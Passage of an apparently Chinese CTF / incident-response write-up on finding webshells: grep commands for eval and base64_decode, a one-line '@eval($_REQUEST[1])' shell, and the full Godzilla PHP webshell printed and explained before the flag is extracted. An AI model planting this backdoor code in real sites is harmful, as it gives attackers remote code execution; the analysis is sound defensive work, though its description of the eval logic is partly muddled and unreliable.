搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">find&lt;/span> &lt;span class="o">./&lt;/span> &lt;span class="nx">type&lt;/span> &lt;span class="nx">f&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">name&lt;/span> &lt;span class="s2">&amp;#34;*.jsp&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">xargs&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="s2">&amp;#34;exec(&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">find&lt;/span> &lt;span class="o">./&lt;/span> &lt;span class="nx">type&lt;/span> &lt;span class="nx">f&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">name&lt;/span> &lt;span class="s2">&amp;#34;*.php&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">xargs&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="s2">&amp;#34;eval(&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">find&lt;/span> &lt;span class="o">./&lt;/span> &lt;span class="nx">type&lt;/span> &lt;span class="nx">f&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">name&lt;/span> &lt;span class="s2">&amp;#34;*.asp&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">xargs&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="s2">&amp;#34;execute(&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">find&lt;/span> &lt;span class="o">./&lt;/span> &lt;span class="nx">type&lt;/span> &lt;span class="nx">f&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">name&lt;/span> &lt;span class="s2">&amp;#34;*.aspx&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">xargs&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="s2">&amp;#34;eval(&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>对于免杀Webshell，可以查看是否使用编码&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">find&lt;/span> &lt;span class="o">./&lt;/span> &lt;span class="nx">type&lt;/span> &lt;span class="nx">f&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">name&lt;/span> &lt;span class="s2">&amp;#34;*.php&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">xargs&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="s2">&amp;#34;base64_decode&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>命令解析：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="mf">1.&lt;/span> &lt;span class="nx">xargs：xargs命令用于将输入数据重新格式化后作为参数传递给其他命令。在这个命令中，&lt;/span>&lt;span class="sb">`xargs`&lt;/span>&lt;span class="nx">将&lt;/span>&lt;span class="sb">`find`&lt;/span>&lt;span class="nx">命令找到的文件列表作为参数传递给&lt;/span>&lt;span class="sb">`grep`&lt;/span>&lt;span class="nx">命令。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">2.&lt;/span> &lt;span class="sb">`grep &amp;#34;eval(&amp;#34;`&lt;/span>&lt;span class="nx">：&lt;/span>&lt;span class="sb">`grep`&lt;/span>&lt;span class="nx">命令用于搜索文本，并输出匹配的行。这里&lt;/span>&lt;span class="sb">`&amp;#34;eval(&amp;#34;`&lt;/span>&lt;span class="nx">是&lt;/span>&lt;span class="sb">`grep`&lt;/span>&lt;span class="nx">命令的搜索模式，用于查找包含&lt;/span>&lt;span class="sb">`eval(`&lt;/span>&lt;span class="nx">字符串的行。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>一个一个进行尝试即可：&lt;br>
这里使用：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">find&lt;/span> &lt;span class="o">./&lt;/span> &lt;span class="nx">type&lt;/span> &lt;span class="nx">f&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">name&lt;/span> &lt;span class="s2">&amp;#34;*.php&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">xargs&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="s2">&amp;#34;eval(&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>发现了三个文件：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">./&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">include&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">gz&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">php&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="k">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$payload&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">./&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">include&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Db&lt;/span>&lt;span class="o">/.&lt;/span>&lt;span class="nx">Mysqli&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">php&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="k">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$payload&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">./&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">shell&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">php&lt;/span>&lt;span class="o">:&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span> &lt;span class="nx">phpinfo&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="k">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_REQUEST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]);&lt;/span>&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319203939.png" alt="Pasted image 20250319203939">&lt;br>
打开gz.php文件&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="nx">ip&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="o">:/&lt;/span>&lt;span class="c1"># cd /var/www/html/include
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="nx">ip&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="o">:/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">include&lt;/span>&lt;span class="c1"># ls
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">common&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">php&lt;/span> &lt;span class="nx">Db&lt;/span> &lt;span class="k">default&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">htm&lt;/span> &lt;span class="nx">gz&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">php&lt;/span> &lt;span class="nx">index&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">htm&lt;/span> &lt;span class="nx">index&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">html&lt;/span> &lt;span class="nx">Model&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="nx">ip&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="o">:/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">include&lt;/span>&lt;span class="c1"># cat gz.php
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>最后终于在gz.php里面发现了，这样一段代码：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">@&lt;/span>&lt;span class="nx">session_start&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">@&lt;/span>&lt;span class="nx">set_time_limit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">@&lt;/span>&lt;span class="nx">error_reporting&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$D&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$K&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$D&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$K&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mi">15&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$D&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$D&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="nv">$c&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nv">$D&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//027ccd04-5065-48b6-a32d-77c704a5e26d
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nv">$payloadName&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;payload&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$key&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;3c6e0b8a9c15224a&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$data&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">file_get_contents&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;php://input&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$data&lt;/span>&lt;span class="o">!==&lt;/span>&lt;span class="k">false&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$data&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$data&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$key&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nv">$payloadName&lt;/span>&lt;span class="p">])){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$payload&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nv">$payloadName&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="nv">$key&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">strpos&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$payload&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;getBasicsInfo&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="k">false&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$payload&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$payload&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$key&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$payload&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">echo&lt;/span> &lt;span class="nx">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="nx">run&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$data&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="nv">$key&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">strpos&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$data&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;getBasicsInfo&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">!==&lt;/span>&lt;span class="k">false&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nv">$payloadName&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$data&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$key&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>简单分析一下这段恶意代码；&lt;/p>
&lt;ol>
&lt;li>&lt;code>@session_start();&lt;/code>：启动会话&lt;/li>
&lt;li>&lt;code>@set_time_limit(0);&lt;/code>：设置脚本执行时间限制为无限制&lt;/li>
&lt;li>&lt;code>@error_reporting(0);&lt;/code>：关闭错误报告&lt;/li>
&lt;li>&lt;code>function encode($D,$K){...}&lt;/code>：定义了一个名为 &lt;code>encode&lt;/code> 的函数，它接受两个参数 &lt;code>$D&lt;/code> 和 &lt;code>$K&lt;/code>。这个函数看起来像是一个简单的异或编码函数，用于对数据进行加密或解密。它使用 &lt;code>$K&lt;/code> 作为密钥，对 &lt;code>$D&lt;/code> 中的每个字符进行异或操作。&lt;/li>
&lt;li>接下来的几行代码定义了 &lt;code>$payloadName&lt;/code>、&lt;code>$key&lt;/code> 和 &lt;code>$data&lt;/code> 变量。&lt;code>$payloadName&lt;/code> 是用于存储有效载荷的会话变量名，&lt;code>$key&lt;/code> 是用于编码的密钥，&lt;code>$data&lt;/code> 是从 &lt;code>php://input&lt;/code> 流中读取的数据。&lt;/li>
&lt;li>&lt;code>if ($data!==false){...}&lt;/code>：如果从 &lt;code>php://input&lt;/code> 读取的数据不是 &lt;code>false&lt;/code>（即成功读取了数据），则执行以下代码块。&lt;/li>
&lt;li>&lt;code>if (isset($_SESSION[$payloadName])){...}&lt;/code>：检查 &lt;code>$payloadName&lt;/code> 对应的会话变量是否已设置。&lt;/li>
&lt;li>&lt;code>if (strpos($payload,&amp;quot;getBasicsInfo&amp;quot;)===false){...}&lt;/code>：检查 &lt;code>$payload&lt;/code> 变量中是否包含字符串 &lt;code>&amp;quot;getBasicsInfo&amp;quot;&lt;/code>。&lt;/li>
&lt;li>&lt;code>eval($payload);&lt;/code>：如果 &lt;code>$payload&lt;/code> 变量包含 &lt;code>&amp;quot;getBasicsInfo&amp;quot;&lt;/code> 字符串，则执行 &lt;code>$payload&lt;/code> 变量中的 PHP 代码。&lt;/li>
&lt;li>&lt;code>echo encode(@run($data),$key);&lt;/code>：如果 &lt;code>$data&lt;/code> 包含 &lt;code>&amp;quot;getBasicsInfo&amp;quot;&lt;/code> 字符串，则执行 &lt;code>@run($data)&lt;/code> 函数，并将结果编码后输出。&lt;br>
&lt;strong>总结：&lt;/strong>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">这段代码的目的是接收通过 php://input 流发送的数据，对其进行编码，并根据会话变量中的内容执行特定的 PHP 代码。这通常用于隐藏恶意代码或后门，使得攻击者可以通过特定的请求触发执行。
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>最后找到flag；&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mo">027&lt;/span>&lt;span class="nx">ccd04&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">5065&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">48&lt;/span>&lt;span class="nx">b6&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">a32d&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">77&lt;/span>&lt;span class="nx">c704a5e26d&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="二flag2">二、flag2&lt;/h2>
&lt;p>&lt;strong>黑客使用的什么工具的shell github地址的md5 flag{md5}&lt;/strong>&lt;br>
遇到这种类型的题目，我们就是要分析一下是什么类型的webshell，其实开头三句就可以分析出是godzilla的webshell了；&lt;br>
为什么这样说？&lt;br>
哥斯拉病毒是一种Java后门木马，通常用于攻击并控制Web服务器。特征就包括：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">1. @session_start(); - 开启一个会话。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2. @set_time_limit(0); - 设置脚本执行时间为无限。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3. @error_reporting(0); - 关闭所有错误报告。
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这些代码行主要用于隐藏病毒活动并确保其能够长时间运行而不被发现。哥斯拉病毒通常会通过Webshell或其他漏洞注入到服务器中，然后使用这些命令来掩盖其存在并执行进一步的恶意操作。&lt;br>
所以我们只需要找到它的github地址并且进行MD5加密即可；&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Godzilla地址：https://github.com/BeichenDream/Godzilla
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>直接使用md5加密网站对网站进行加密即可！&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
